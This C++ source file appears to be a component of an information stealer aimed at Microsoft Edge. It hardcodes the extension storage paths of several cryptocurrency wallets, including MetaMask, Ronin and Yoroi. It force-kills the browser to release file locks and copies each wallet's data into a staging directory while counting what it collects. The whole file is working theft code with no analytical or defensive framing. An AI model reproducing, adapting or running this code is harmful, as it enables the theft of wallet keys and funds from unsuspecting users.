#include "EdgExtensions.h"
#include "Paths.h"
#include "Counter.h"
#include <iostream>
#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
#include <experimental/filesystem>
#include "Filemanager.h"
// Define a namespace alias for the experimental filesystem library
namespace fs = std::experimental::filesystem;

// Initialize a vector containing wallet directories associated with various Edge extensions
std::vector<std::pair<std::string, std::string>> EdgExtensions::EdgWalletsDirectories = {
    {"Edge_Auvitas",        "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\klfhbdnlcfcaccoakhceodhldjojboga"},
    {"Edge_Math",           "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dfeccadlilpndjjohbjdblepmjeahlmm"},
    {"Edge_Metamask",       "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},
    {"Edge_Rabet",          "\\Microsoft\\Edge\\User Data\\Default\\Extensions\\aanjhgiamnacdfnlfnmgehjikagdbafd"},
    {"Edge_Ronin",          "\\Microsoft\\Edge\\User Data\\Default\\Extensions\\kjmoohlgokccodicjjfebfomlbljgfhk"},
    {"Edge_Yoroi",          "\\Microsoft\\Edge\\User Data\\Default\\Extensions\\akoiaibnepcedcplijmiamnaigbepmcb"},
    {"Edge_Terra_Station",  "\\Microsoft\\Edge\\User Data\\Default\\Extensions\\ajkhoeiiokighlmdnlakpjfoobnjinie"},
};

// Function to copy a wallet directory to a specified save directory
void EdgExtensions::CopyWalletFromDirectoryTo(std::string& sSaveDir, std::string& sWalletDir, std::string& sWalletName)
{
    // Construct the target directory path by appending the wallet name to the save directory
    std::string sdir = sSaveDir + "\\" + sWalletName;

    // Check if the wallet directory exists; if not, return early
    if (!fs::exists(sWalletDir))
    {
        return;
    }

    // Terminate the Edge browser process to avoid file locking issues
    Filemanager::killprocess("msedge.exe");

    // Copy the wallet directory to the target directory recursively
    fs::copy(sWalletDir, sdir, fs::copy_options::recursive);

    // Increment the counter for successfully copied browser wallets
    Counter::BrowserWallets++;
}

// Function to retrieve all Edge wallet directories and copy them to a specified save directory
void EdgExtensions::GetChromeWallets(std::string& sSaveDir)
{
    try
    {
        // Create the base save directory if it doesn't already exist
        fs::create_directories(sSaveDir);

        // Iterate over all wallet directories defined in EdgWalletsDirectories
        for (auto& dir : EdgWalletsDirectories)
        {
            // Prepend the local application data path to the wallet directory path
            dir.second = Paths::Lappdata + dir.second;

            // Attempt to copy the wallet directory to the save directory
            CopyWalletFromDirectoryTo(sSaveDir, dir.second, dir.first);
        }

        // If no wallets were copied, remove the save directory to clean up
        if (Counter::BrowserWallets == 0)
        {
            fs::remove_all(sSaveDir);
        }
    }
    // Catch and handle any filesystem errors that may occur
    catch (const fs::filesystem_error& e)
    {
        // Print the error message to the console for debugging
        std::cout << "GetChromeWallets: " << e.what() << std::endl;
    }
}
